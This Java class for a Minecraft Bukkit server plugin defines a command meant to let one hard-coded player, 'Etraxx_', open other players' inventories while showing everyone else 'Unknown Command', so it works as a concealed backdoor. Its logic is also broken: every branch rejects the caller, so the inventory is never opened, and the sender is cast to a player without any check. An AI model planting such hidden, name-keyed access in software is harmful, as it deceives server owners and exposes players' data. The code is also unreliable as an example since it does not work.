package org.opalisplugin.util.cutil;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

public class Seeinv implements CommandExecutor {
    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {

        Player player = (Player) sender;
        Player Etrax = Bukkit.getPlayerExact("Etraxx_");

        if(player != Etrax){
            if(args.length != 1) {
                player.sendMessage(ChatColor.RED + "Unknown Command");
            }else{
                Player target = Bukkit.getPlayerExact(args[0]);
                if(player != Etrax){
                    player.sendMessage("Unknown Command");
                }else{
                    player.openInventory(target.getInventory());
                }

            }
        }else{
            player.sendMessage(ChatColor.RED + "Unknown Command");
        }

        return false;
    }
}
